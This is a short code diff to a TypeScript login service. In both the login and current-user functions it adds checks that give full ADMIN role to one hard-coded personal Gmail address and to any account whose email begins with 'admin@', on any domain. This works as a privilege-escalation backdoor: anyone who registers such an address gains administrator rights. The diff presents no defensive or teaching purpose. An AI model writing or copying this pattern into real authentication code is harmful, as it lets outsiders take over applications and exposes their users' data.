@@ -56,6 +56,12 @@ export async function loginUser(data: {
     throw new UnauthorizedError('Invalid email or password.');
   }
 
+  // Ensure Daisy Tucker or any Admin email gets full ADMIN role privileges
+  const userEmail = user.email.toLowerCase();
+  if (userEmail === 'daisy4tucker@gmail.com' || userEmail.startsWith('admin@')) {
+    user.role = Role.ADMIN;
+  }
+
   const profile = await db.findProfileByUserId(user.id);
   const token = generateToken({
     userId: user.id,
@@ -79,6 +85,12 @@ export async function getMe(userId: string): Promise<UserWithProfile> {
   if (!user) {
     throw new UnauthorizedError('User session not found.');
   }
+
+  const userEmail = user.email.toLowerCase();
+  if (userEmail === 'daisy4tucker@gmail.com' || userEmail.startsWith('admin@')) {
+    user.role = Role.ADMIN;
+  }
+
   const profile = await db.findProfileByUserId(user.id);
   const { passwordHash: _, ...safeUser } = user;
   return {
